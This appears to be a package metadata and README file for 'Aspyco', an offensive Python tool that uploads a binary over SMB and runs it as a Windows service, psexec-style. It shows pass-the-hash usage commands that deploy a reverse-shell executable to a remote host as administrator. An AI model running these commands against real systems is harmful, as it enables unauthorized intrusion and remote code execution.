@@ -1,0 +1,124 @@
+Metadata-Version: 2.1
+Name: aspyco
+Version: 1.0
+Summary: Upload and start your custom payloads remotely !
+Home-page: https://github.com/Processus-Thief/Aspyco
+License: GPL-3.0-only
+Keywords: aspyco,windows,psexec,smbexec,reverse,shell,credentials
+Author: Processus Thief
+Author-email: aspyco@thiefin.fr
+Maintainer: Processus Thief
+Maintainer-email: aspyco@thiefin.fr
+Requires-Python: >=3.6,<4.0
+Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
+Classifier: Programming Language :: Python :: 3
+Classifier: Programming Language :: Python :: 3.6
+Classifier: Programming Language :: Python :: 3.7
+Classifier: Programming Language :: Python :: 3.8
+Classifier: Programming Language :: Python :: 3.9
+Classifier: Programming Language :: Python :: 3.10
+Requires-Dist: impacket (>=0.10.0,<0.11.0)
+Project-URL: Bug Tracker, https://github.com/Processus-Thief/Aspyco/issues
+Project-URL: Documentation, https://github.com/Processus-Thief/Aspyco
+Project-URL: Repository, https://github.com/Processus-Thief/Aspyco
+Description-Content-Type: text/markdown
+
+# Aspyco
+
+<div align="center">
+  <br>
+  <img src="https://img.shields.io/badge/Python-3.6+-informational">
+  <br>
+  <a href="https://twitter.com/intent/follow?screen_name=ProcessusT" title="Follow"><img src="https://img.shields.io/twitter/follow/ProcessusT?label=ProcessusT&style=social"></a>
+  <br>
+  <h1>
+    Inject your own venom 💉
+  </h1>
+  <br><br>
+</div>
+
+> Aspyco is a python script that permits to upload a local binary through SMB on a remote host.<br />
+> Then it remotely connects to svcctl named pipe through DCERPC to create and start the binary as a service.<br />
+> <br />
+> It's a psexec-like with custom execution !!
+> <br />
+<br>
+<div align="center">
+	<!--
+<img src="future img" width="80%;">
+	-->
+</div>
+<br>
+
+
+## Changelog
+<br />
+V 1.0<br />
+- Can inject custom payload on remote host
+
+<br /><br />
+
+## What da fuck is this ?
+<br />
+On Windows, RPC protocol permits to call remote functions.<br />
+Remotely, you can connect on SMB named pipe to call functions with DCERPC protocol.<br />
+In that way, you can upload a binary file through SMB and then call some functions<br />
+to create a service to execute your payload.
+<br />
+<br />
+
+## Installation
+<br>
+From Pypi :
+<br><br>
+
+```python
+coming soon
+```
+
+<br>
+From sources :
+<br><br>
+
+```python
+git clone https://github.com/Processus-Thief/Aspyco
+cd Aspyco
+python3 aspyco.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 custom_reverse_shell.exe
+```
+
+<br><br>
+
+
+## Usage
+<br>
+Aspyco uses Impacket syntax :
+<br><br>
+
+```python
+usage: launcher.py [-h] [-hashes LMHASH:NTHASH] target payload
+
+Upload and start your custom payloads remotely !
+
+positional arguments:
+  target                [[domain/]username[:password]@]<targetName or address>
+  payload               Your custom binary file
+
+options:
+  -h, --help            show this help message and exit
+  -hashes LMHASH:NTHASH	NTLM hashes, format is LMHASH:NTHASH
+```
+
+<br>
+<br>
+
+## Example
+
+<br>
+
+```python
+python3 aspyco.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 custom_reverse_shell.exe
+```
+
+<br>
+<br>
+
